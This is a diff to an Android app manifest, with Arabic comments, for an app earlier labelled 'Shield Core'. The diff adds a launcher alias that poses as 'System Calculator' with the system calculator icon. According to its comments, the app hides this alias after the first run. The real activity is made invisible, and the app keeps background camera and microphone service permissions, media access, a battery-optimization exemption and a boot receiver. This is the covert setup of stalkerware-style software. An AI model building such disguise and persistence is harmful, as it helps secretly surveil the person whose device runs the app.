@@ -17,48 +17,27 @@
 
     <!-- ============================================================
          أذونات التخزين للوصول إلى الوسائط
-         - Android 13+ (API 33+): استخدام أذونات READ_MEDIA_* المنفصلة
-         - Android 10-12 (API 29-32): استخدام READ_EXTERNAL_STORAGE
-         - Android 9- (API < 29): استخدام READ_EXTERNAL_STORAGE و WRITE_EXTERNAL_STORAGE
     ============================================================ -->
-    <!-- أذونات Android 13+ (API 33+) -->
     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
     <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
     <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
 
-    <!-- أذونات Android 10-12 (API 29-32) - للقراءة فقط -->
     <uses-permission
         android:name="android.permission.READ_EXTERNAL_STORAGE"
         android:maxSdkVersion="32" />
 
-    <!-- أذونات Android 9- (API < 29) - للقراءة والكتابة -->
     <uses-permission
         android:name="android.permission.WRITE_EXTERNAL_STORAGE"
         android:maxSdkVersion="28"
         tools:ignore="ScopedStorage" />
 
     <!-- ============================================================
-         أذونات الإشعارات (Android 13+ API 33+)
-         مطلوبة لعرض إشعار الخدمة الخلفية
+         أذونات الإشعارات والخدمات
     ============================================================ -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
-
-    <!-- ============================================================
-         إذن طلب استثناء تحسين البطارية (مطلوب للخدمات الخلفية المستمرة)
-         يسمح للتطبيق بطلب تجاوز تحسينات البطارية لضمان استمرارية الخدمة
-    ============================================================ -->
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
-
-    <!-- ============================================================
-         أذونات الخدمة الأمامية (Foreground Service) المطلوبة لأندرويد 10+
-         - FOREGROUND_SERVICE: مطلوب لتشغيل الخدمة الأمامية
-         - FOREGROUND_SERVICE_DATA_SYNC: مطلوب لأندرويد 14+ (API 34) لتحديد نوع الخدمة
-         - FOREGROUND_SERVICE_CAMERA: مطلوب عند استخدام الكاميرا في الخلفية (Android 14+)
-         - FOREGROUND_SERVICE_MICROPHONE: مطلوب عند استخدام الميكروفون في الخلفية (Android 14+)
-    ============================================================ -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
-    <!-- ✅ إبقاء أذونات الكاميرا والميكروفون للخدمة الأمامية في حال استخدامها -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
 
@@ -70,7 +49,7 @@
     <uses-permission android:name="android.permission.VIBRATE" />
 
     <!-- ============================================================
-         ميزات الجهاز (جميعها اختيارية لتوسيع التوافق)
+         ميزات الجهاز (جميعها اختيارية)
     ============================================================ -->
     <uses-feature
         android:name="android.hardware.camera"
@@ -87,16 +66,13 @@
 
     <!-- ============================================================
          التطبيق
-         ✅ تم تعطيل الاتصالات غير المشفرة (Cleartext Traffic) للأمان
-         ✅ تم ربط ملف أمان الشبكة (network_security_config.xml)
-         ✅ تم إزالة tools:replace="android:label" لإصلاح التحذير
     ============================================================ -->
     <application
         android:allowBackup="true"
         android:allowClearUserData="true"
         android:hardwareAccelerated="true"
         android:icon="@drawable/ic_launcher"
-        android:label="Shield Core"
+        android:label="@string/app_name"
         android:supportsRtl="true"
         android:theme="@style/Theme.AppCompat.Light.NoActionBar"
         android:usesCleartextTraffic="false"
@@ -106,27 +82,40 @@
         tools:ignore="GoogleAppIndexingWarning"
         tools:targetApi="34">
 
-        <!-- ====== النشاط الرئيسي ====== -->
-        <activity
-            android:name=".MainActivity"
-            android:configChanges="orientation|screenSize|keyboardHidden"
+        <!-- ============================================================
+             ✅ النشاط الوهمي (Alias) – نقطة الدخول الوحيدة المرئية
+             - يظهر في درج التطبيقات باسم "System Calculator" وأيقونة نظامية
+             - عند تشغيله، يتم تشغيل MainActivity الحقيقي
+             - بعد التشغيل الأول، يتم إخفاء هذا Alias بواسطة MainActivity.disableLauncherIcon()
+        ============================================================ -->
+        <activity-alias
+            android:name=".MainActivityAlias"
+            android:targetActivity=".MainActivity"
             android:exported="true"
-            android:launchMode="singleTop"
-            android:screenOrientation="portrait">
+            android:icon="@android:drawable/ic_menu_calculator"
+            android:label="@string/app_name_alias"
+            android:theme="@style/Theme.AppCompat">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity>
+        </activity-alias>
+
+        <!-- ============================================================
+             ✅ النشاط الحقيقي – مخفي وغير مرئي في درج التطبيقات
+             - exported="false" يمنع الوصول من خارج التطبيق
+             - بدون intent-filter للـ LAUNCHER، لا يظهر في درج التطبيقات
+        ============================================================ -->
+        <activity
+            android:name=".MainActivity"
+            android:configChanges="orientation|screenSize|keyboardHidden"
+            android:exported="false"
+            android:launchMode="singleTop"
+            android:screenOrientation="portrait"
+            android:theme="@style/Theme.AppCompat.Translucent.NoActionBar" />
 
         <!-- ============================================================
              ✅ الخدمة الأمامية (Foreground Service)
-             - تم تغيير foregroundServiceType إلى "dataSync" فقط
-               لتجنب رفض الخدمة على Android 14+ (API 34) في حال عدم استخدام
-               الكاميرا أو الميكروفون بشكل مستمر.
-             - stopWithTask="false" تمنع إيقاف الخدمة عند إغلاق التطبيق من القائمة
-             - android:exported="false" تمنع الوصول من تطبيقات أخرى
-             - android:enabled="true" تضمن تمكين الخدمة
         ============================================================ -->
         <service
             android:name=".ForegroundService"
@@ -137,8 +126,6 @@
 
         <!-- ============================================================
              ✅ مستقبل البث عند بدء التشغيل (BootReceiver)
-             - يسمح بتشغيل الخدمة تلقائياً بعد إعادة تشغيل الجهاز
-             - تم إضافة QUICKBOOT_POWERON للتوافق مع أجهزة معينة
         ============================================================ -->
         <receiver
             android:name=".BootReceiver"
